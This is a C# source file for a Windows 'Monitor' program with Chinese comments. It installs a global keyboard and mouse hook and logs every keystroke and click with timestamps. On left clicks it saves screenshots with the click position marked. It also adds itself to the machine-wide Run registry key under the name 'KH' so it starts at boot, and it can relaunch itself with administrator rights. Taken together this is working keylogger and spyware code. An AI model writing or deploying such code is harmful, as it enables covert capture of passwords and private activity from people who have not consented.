using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Security.Principal;
using System.Diagnostics;
using System.ComponentModel;

namespace Monitor
{
    public class Operate
    {
        UserActivityHook _hook;
        /// <summary>
        /// 与当前传入信息匹配的保存图片
        /// </summary>
        public string[] ValidsSave { set; get; }
        /// <summary>
        /// 当前匹配的所有数据集
        /// </summary>
        public string[] AllValids { set; get; }
        /// <summary>
        /// 是否保存图片
        /// </summary>
        bool isSaveImg;
        public bool IsSaveImg
        {
            set
            {
                isSaveImg = value;

            }
            get
            {
                var IsAny = false;
                if (AllValids != null && ValidsSave != null)
                {
                    foreach (var item in ValidsSave)
                    {
                        if (AllValids.Any(a => a.ToLower().IndexOf(item.ToLower()) > -1))
                        {
                            IsAny = true;
                            break;
                        }
                    }
                }
                else
                {
                    IsAny = true;
                }
                if (ValidsSave != null && ValidsSave.Join("").Length == 0)
                {
                    IsAny = true;
                }
                return isSaveImg && IsAny;
            }
        }



        public static String APPPath
        {
            get
            {
                return Path.Combine(AppDomain.CurrentDomain.SetupInformation.ApplicationBase, AppDomain.CurrentDomain.SetupInformation.ApplicationName);

            }
        }

        public void Init()
        {
            Log.WriteLine("Monitor.Init");
            try
            {

                _hook = new UserActivityHook();
                new Thread(() =>
                {
                    _hook.Start();
                }).Start();
                _hook.KeyUp += hook_KeyUp;
                _hook.OverKeyUp += _hook_OverKeyUp;
                _hook.OnMouseLeft += _hook_OnMouseLeft;
                _hook.OnMouseLeftClick += _hook_OnMouseLeftClick;
                _hook.OnMouseRight += _hook_OnMouseRight;
                _hook.OnMouseRightClick += _hook_OnMouseRightClick;
                RegisterRegedit();



            }
            catch (Exception e)
            {
                Log.WriteLine("StackTrace:" + e.StackTrace + "\tSource:" + e.Source + "\tHelpLink:" + e.HelpLink + "\tMessage:" + e.Message + "\tData:" + e.Data);
            }

        }



        void _hook_OnMouseRightClick(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标右双击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseRight(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标右单击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseLeftClick(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标左双击【x:{0}:y{1}】", e.X, e.Y));
        }

        void _hook_OnMouseLeft(object sender, MouseEventArgs e)
        {
            Log.WriteLine(string.Format("鼠标左单击【x:{0}:y{1}】", e.X, e.Y));
            if (IsSaveImg)
            {
                var img = Img.Cut();
                using (Graphics g = Graphics.FromImage(img))
                {
                    var x = e.X;
                    var y = e.Y;
                    // img = Img.GetReducedImage(img,0.5);
                    g.DrawLine(new Pen(Color.Red, 3), x - 40, y - 15, x - 40, y + 15);//坐标
                    g.DrawLine(new Pen(Color.Red, 3), x + 40, y - 15, x + 40, y + 15);//坐标
                    g.DrawLine(new Pen(Color.Red, 3), x, y, x + 1, y + 1);//坐标
                    g.DrawLine(new Pen(Color.Red, 3), x - 40, y - 15, x + 40, y - 15);//坐标
                    g.DrawLine(new Pen(Color.Red, 3), x - 40, y + 15, x + 40, y + 15);//坐标

                }

                Log.WriteImg(img);
            }
            else
            {
                Log.WriteLine(string.Format("IsSaveImg等于{0}不保存", IsSaveImg));
            }
        }

        void _hook_OverKeyUp(object sender, MouseEventArgs e)
        {
            Log.WriteLine("\r\n结束按键\r\n\r\n");
        }

        void hook_KeyUp(object sender, KeyEventArgs e)
        {
            if (_hook.IsFirstKeyUp)
            {
                Log.WriteLine("\r\n键盘开始输入date:" + DateTime.Now.ToString("yyyy/MM/dd hh:mm:ss") + "\r\n");
            }

            Log.WriteLine(new KeysConverter().ConvertToString(e.KeyData));
        }







        void RegisterRegedit()
        {

            const String KEY = "KH";
            var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
            var appPath = APPPath + " -regedit";
            var autoRun = key.GetValue(KEY);
            if (autoRun == null || !autoRun.Equals(appPath))
            {
                key.SetValue(KEY, appPath);
            }
        }


        public static Boolean IsWho(WindowsBuiltInRole role)
        {
            bool isWho;
            try
            {
                //get the currently logged in user
                WindowsIdentity user = WindowsIdentity.GetCurrent();
                WindowsPrincipal principal = new WindowsPrincipal(user);
                Log.WriteLine(user.Name);
                isWho = principal.IsInRole(role);
            }
            catch (UnauthorizedAccessException ex)
            {
                isWho = false;
                Log.WriteLine("UnauthorizedAccessException:" + ex.Message);
            }
            catch (Exception ex)
            {
                isWho = false;
                Log.WriteLine("Exception:" + ex.Message);
            }
            return isWho;
        }

        public static Boolean IsAdministrator
        {
            get
            {
                return IsWho(WindowsBuiltInRole.Administrator);
            }
        }


        public static Boolean IsSystem
        {
            get
            {
                return IsWho(WindowsBuiltInRole.SystemOperator);
            }
        }


        public static void RestartApplicationAsAdministrator()
        {
            ProcessStartInfo info = new ProcessStartInfo(APPPath);
            info.UseShellExecute = true;
            info.Verb = "runas";
            try
            {
                Process.Start(info);
            }
            catch (Win32Exception ex)
            {
                Log.WriteLine("RestartException:" + ex.Message);
            }
            finally
            {
                Environment.Exit(0);
            }
        }
    }
}